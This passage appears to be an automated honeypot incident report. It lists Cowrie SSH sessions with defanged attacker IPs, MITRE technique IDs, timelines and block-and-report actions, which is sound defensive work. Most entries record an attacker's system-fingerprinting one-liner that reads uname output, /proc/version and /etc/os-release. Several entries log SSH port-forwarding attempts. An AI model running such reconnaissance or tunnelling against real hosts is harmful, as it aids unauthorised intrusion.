| `2026-07-19 05:39:54` | `cowrie.command.input` |
| `2026-07-19 05:39:54` | `cowrie.command.input` |
| `2026-07-19 05:39:54` | `cowrie.command.input` |
| `2026-07-19 05:39:54` | `cowrie.command.input` |
| `2026-07-19 05:39:54` | `cowrie.command.input` |
| `2026-07-19 05:39:54` | `cowrie.command.success` |
| `2026-07-19 05:39:54` | `cowrie.command.input` |
| `2026-07-19 05:39:54` | `cowrie.command.input` |
| `2026-07-19 05:39:54` | `cowrie.command.input` |
| `2026-07-19 05:39:54` | `cowrie.command.input` |
| `2026-07-19 05:39:54` | `cowrie.log.closed` |
| `2026-07-19 05:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6ad99571fc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:41 |
| **Last Seen** | 2026-07-19 05:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:41:42` | `cowrie.session.connect` |
| `2026-07-19 05:41:42` | `cowrie.client.version` |
| `2026-07-19 05:41:42` | `cowrie.client.kex` |
| `2026-07-19 05:41:43` | `cowrie.login.success` |
| `2026-07-19 05:41:44` | `cowrie.session.params` |
| `2026-07-19 05:41:44` | `cowrie.command.input` |
| `2026-07-19 05:41:44` | `cowrie.command.input` |
| `2026-07-19 05:41:44` | `cowrie.command.input` |
| `2026-07-19 05:41:44` | `cowrie.command.input` |
| `2026-07-19 05:41:44` | `cowrie.command.input` |
| `2026-07-19 05:41:44` | `cowrie.command.success` |
| `2026-07-19 05:41:44` | `cowrie.command.input` |
| `2026-07-19 05:41:44` | `cowrie.command.input` |
| `2026-07-19 05:41:44` | `cowrie.command.input` |
| `2026-07-19 05:41:44` | `cowrie.command.input` |
| `2026-07-19 05:41:45` | `cowrie.log.closed` |
| `2026-07-19 05:41:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-791d17210524

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:43 |
| **Last Seen** | 2026-07-19 05:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:43:24` | `cowrie.session.connect` |
| `2026-07-19 05:43:24` | `cowrie.client.version` |
| `2026-07-19 05:43:25` | `cowrie.client.kex` |
| `2026-07-19 05:43:26` | `cowrie.login.success` |
| `2026-07-19 05:43:27` | `cowrie.session.params` |
| `2026-07-19 05:43:27` | `cowrie.command.input` |
| `2026-07-19 05:43:27` | `cowrie.command.input` |
| `2026-07-19 05:43:27` | `cowrie.command.input` |
| `2026-07-19 05:43:27` | `cowrie.command.input` |
| `2026-07-19 05:43:27` | `cowrie.command.input` |
| `2026-07-19 05:43:27` | `cowrie.command.success` |
| `2026-07-19 05:43:27` | `cowrie.command.input` |
| `2026-07-19 05:43:27` | `cowrie.command.input` |
| `2026-07-19 05:43:27` | `cowrie.command.input` |
| `2026-07-19 05:43:27` | `cowrie.command.input` |
| `2026-07-19 05:43:28` | `cowrie.log.closed` |
| `2026-07-19 05:43:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-176d9d2da33f

| Field | Detail |
|---|---|
| **Source IP** | `122.186.249[.]6` |
| **First Seen** | 2026-07-19 05:43 |
| **Last Seen** | 2026-07-19 05:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:43:47` | `cowrie.session.connect` |
| `2026-07-19 05:43:48` | `cowrie.client.version` |
| `2026-07-19 05:43:48` | `cowrie.client.kex` |
| `2026-07-19 05:43:50` | `cowrie.login.success` |
| `2026-07-19 05:43:50` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.186.249[.]6` to AbuseIPDB if not already reported
- [ ] Block `122.186.249[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f549ca18bfcb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:45 |
| **Last Seen** | 2026-07-19 05:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:45:11` | `cowrie.session.connect` |
| `2026-07-19 05:45:11` | `cowrie.client.version` |
| `2026-07-19 05:45:11` | `cowrie.client.kex` |
| `2026-07-19 05:45:13` | `cowrie.login.success` |
| `2026-07-19 05:45:14` | `cowrie.session.params` |
| `2026-07-19 05:45:14` | `cowrie.command.input` |
| `2026-07-19 05:45:14` | `cowrie.command.input` |
| `2026-07-19 05:45:14` | `cowrie.command.input` |
| `2026-07-19 05:45:14` | `cowrie.command.input` |
| `2026-07-19 05:45:14` | `cowrie.command.input` |
| `2026-07-19 05:45:14` | `cowrie.command.success` |
| `2026-07-19 05:45:14` | `cowrie.command.input` |
| `2026-07-19 05:45:14` | `cowrie.command.input` |
| `2026-07-19 05:45:14` | `cowrie.command.input` |
| `2026-07-19 05:45:14` | `cowrie.command.input` |
| `2026-07-19 05:45:14` | `cowrie.log.closed` |
| `2026-07-19 05:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3dc3fddc923

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:47 |
| **Last Seen** | 2026-07-19 05:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:47:03` | `cowrie.session.connect` |
| `2026-07-19 05:47:03` | `cowrie.client.version` |
| `2026-07-19 05:47:03` | `cowrie.client.kex` |
| `2026-07-19 05:47:04` | `cowrie.login.success` |
| `2026-07-19 05:47:05` | `cowrie.session.params` |
| `2026-07-19 05:47:05` | `cowrie.command.input` |
| `2026-07-19 05:47:05` | `cowrie.command.input` |
| `2026-07-19 05:47:05` | `cowrie.command.input` |
| `2026-07-19 05:47:05` | `cowrie.command.input` |
| `2026-07-19 05:47:05` | `cowrie.command.input` |
| `2026-07-19 05:47:05` | `cowrie.command.success` |
| `2026-07-19 05:47:05` | `cowrie.command.input` |
| `2026-07-19 05:47:05` | `cowrie.command.input` |
| `2026-07-19 05:47:05` | `cowrie.command.input` |
| `2026-07-19 05:47:05` | `cowrie.command.input` |
| `2026-07-19 05:47:06` | `cowrie.log.closed` |
| `2026-07-19 05:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-760c6c0eede9

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-07-19 05:48 |
| **Last Seen** | 2026-07-19 05:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:48:18` | `cowrie.session.connect` |
| `2026-07-19 05:48:19` | `cowrie.client.version` |
| `2026-07-19 05:48:19` | `cowrie.client.kex` |
| `2026-07-19 05:48:21` | `cowrie.login.success` |
| `2026-07-19 05:48:22` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:48:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd6f84ddfdce

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-07-19 05:48 |
| **Last Seen** | 2026-07-19 05:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:48:31` | `cowrie.session.connect` |
| `2026-07-19 05:48:32` | `cowrie.client.version` |
| `2026-07-19 05:48:32` | `cowrie.client.kex` |
| `2026-07-19 05:48:34` | `cowrie.login.success` |
| `2026-07-19 05:48:35` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16c0ec02fc7f

| Field | Detail |
|---|---|
| **Source IP** | `5.140.212[.]144` |
| **First Seen** | 2026-07-19 05:48 |
| **Last Seen** | 2026-07-19 05:48 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:48:45` | `cowrie.session.connect` |
| `2026-07-19 05:48:46` | `cowrie.client.version` |
| `2026-07-19 05:48:46` | `cowrie.client.kex` |
| `2026-07-19 05:48:50` | `cowrie.login.success` |
| `2026-07-19 05:48:52` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.140.212[.]144` to AbuseIPDB if not already reported
- [ ] Block `5.140.212[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd6baadb24c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:48 |
| **Last Seen** | 2026-07-19 05:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:48:55` | `cowrie.session.connect` |
| `2026-07-19 05:48:56` | `cowrie.client.version` |
| `2026-07-19 05:48:56` | `cowrie.client.kex` |
| `2026-07-19 05:48:57` | `cowrie.login.success` |
| `2026-07-19 05:48:58` | `cowrie.session.params` |
| `2026-07-19 05:48:58` | `cowrie.command.input` |
| `2026-07-19 05:48:58` | `cowrie.command.input` |
| `2026-07-19 05:48:58` | `cowrie.command.input` |
| `2026-07-19 05:48:58` | `cowrie.command.input` |
| `2026-07-19 05:48:58` | `cowrie.command.input` |
| `2026-07-19 05:48:58` | `cowrie.command.success` |
| `2026-07-19 05:48:58` | `cowrie.command.input` |
| `2026-07-19 05:48:58` | `cowrie.command.input` |
| `2026-07-19 05:48:58` | `cowrie.command.input` |
| `2026-07-19 05:48:58` | `cowrie.command.input` |
| `2026-07-19 05:48:59` | `cowrie.log.closed` |
| `2026-07-19 05:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beac43fcc465

| Field | Detail |
|---|---|
| **Source IP** | `218.23.95[.]14` |
| **First Seen** | 2026-07-19 05:49 |
| **Last Seen** | 2026-07-19 05:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:49:03` | `cowrie.session.connect` |
| `2026-07-19 05:49:04` | `cowrie.client.version` |
| `2026-07-19 05:49:04` | `cowrie.client.kex` |
| `2026-07-19 05:49:06` | `cowrie.login.success` |
| `2026-07-19 05:49:06` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.23.95[.]14` to AbuseIPDB if not already reported
- [ ] Block `218.23.95[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9700f6155e78

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:50 |
| **Last Seen** | 2026-07-19 05:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:50:38` | `cowrie.session.connect` |
| `2026-07-19 05:50:39` | `cowrie.client.version` |
| `2026-07-19 05:50:39` | `cowrie.client.kex` |
| `2026-07-19 05:50:40` | `cowrie.login.success` |
| `2026-07-19 05:50:42` | `cowrie.session.params` |
| `2026-07-19 05:50:42` | `cowrie.command.input` |
| `2026-07-19 05:50:42` | `cowrie.command.input` |
| `2026-07-19 05:50:42` | `cowrie.command.input` |
| `2026-07-19 05:50:42` | `cowrie.command.input` |
| `2026-07-19 05:50:42` | `cowrie.command.input` |
| `2026-07-19 05:50:42` | `cowrie.command.success` |
| `2026-07-19 05:50:42` | `cowrie.command.input` |
| `2026-07-19 05:50:42` | `cowrie.command.input` |
| `2026-07-19 05:50:42` | `cowrie.command.input` |
| `2026-07-19 05:50:42` | `cowrie.command.input` |
| `2026-07-19 05:50:42` | `cowrie.log.closed` |
| `2026-07-19 05:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c02440b07ca

| Field | Detail |
|---|---|
| **Source IP** | `222.120.176[.]6` |
| **First Seen** | 2026-07-19 05:51 |
| **Last Seen** | 2026-07-19 05:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:51:47` | `cowrie.session.connect` |
| `2026-07-19 05:51:48` | `cowrie.client.version` |
| `2026-07-19 05:51:48` | `cowrie.client.kex` |
| `2026-07-19 05:51:51` | `cowrie.login.success` |
| `2026-07-19 05:51:51` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.120.176[.]6` to AbuseIPDB if not already reported
- [ ] Block `222.120.176[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f386c7f1202

| Field | Detail |
|---|---|
| **Source IP** | `92.255.196[.]185` |
| **First Seen** | 2026-07-19 05:52 |
| **Last Seen** | 2026-07-19 05:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:52:01` | `cowrie.session.connect` |
| `2026-07-19 05:52:01` | `cowrie.client.version` |
| `2026-07-19 05:52:01` | `cowrie.client.kex` |
| `2026-07-19 05:52:02` | `cowrie.login.success` |
| `2026-07-19 05:52:02` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.255.196[.]185` to AbuseIPDB if not already reported
- [ ] Block `92.255.196[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-347dd7a01476

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 05:52 |
| **Last Seen** | 2026-07-19 05:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:52:19` | `cowrie.session.connect` |
| `2026-07-19 05:52:19` | `cowrie.client.version` |
| `2026-07-19 05:52:19` | `cowrie.client.kex` |
| `2026-07-19 05:52:20` | `cowrie.login.success` |
| `2026-07-19 05:52:20` | `cowrie.session.params` |
| `2026-07-19 05:52:20` | `cowrie.command.input` |
| `2026-07-19 05:52:20` | `cowrie.log.closed` |
| `2026-07-19 05:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-207c70c5bcba

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:52 |
| **Last Seen** | 2026-07-19 05:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:52:21` | `cowrie.session.connect` |
| `2026-07-19 05:52:21` | `cowrie.client.version` |
| `2026-07-19 05:52:21` | `cowrie.client.kex` |
| `2026-07-19 05:52:23` | `cowrie.login.success` |
| `2026-07-19 05:52:24` | `cowrie.session.params` |
| `2026-07-19 05:52:24` | `cowrie.command.input` |
| `2026-07-19 05:52:24` | `cowrie.command.input` |
| `2026-07-19 05:52:24` | `cowrie.command.input` |
| `2026-07-19 05:52:24` | `cowrie.command.input` |
| `2026-07-19 05:52:24` | `cowrie.command.input` |
| `2026-07-19 05:52:24` | `cowrie.command.success` |
| `2026-07-19 05:52:24` | `cowrie.command.input` |
| `2026-07-19 05:52:24` | `cowrie.command.input` |
| `2026-07-19 05:52:24` | `cowrie.command.input` |
| `2026-07-19 05:52:24` | `cowrie.command.input` |
| `2026-07-19 05:52:25` | `cowrie.log.closed` |
| `2026-07-19 05:52:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3a8ffb481d9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:54 |
| **Last Seen** | 2026-07-19 05:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:54:04` | `cowrie.session.connect` |
| `2026-07-19 05:54:05` | `cowrie.client.version` |
| `2026-07-19 05:54:05` | `cowrie.client.kex` |
| `2026-07-19 05:54:06` | `cowrie.login.success` |
| `2026-07-19 05:54:07` | `cowrie.session.params` |
| `2026-07-19 05:54:07` | `cowrie.command.input` |
| `2026-07-19 05:54:07` | `cowrie.command.input` |
| `2026-07-19 05:54:07` | `cowrie.command.input` |
| `2026-07-19 05:54:07` | `cowrie.command.input` |
| `2026-07-19 05:54:07` | `cowrie.command.input` |
| `2026-07-19 05:54:07` | `cowrie.command.success` |
| `2026-07-19 05:54:07` | `cowrie.command.input` |
| `2026-07-19 05:54:07` | `cowrie.command.input` |
| `2026-07-19 05:54:07` | `cowrie.command.input` |
| `2026-07-19 05:54:07` | `cowrie.command.input` |
| `2026-07-19 05:54:08` | `cowrie.log.closed` |
| `2026-07-19 05:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
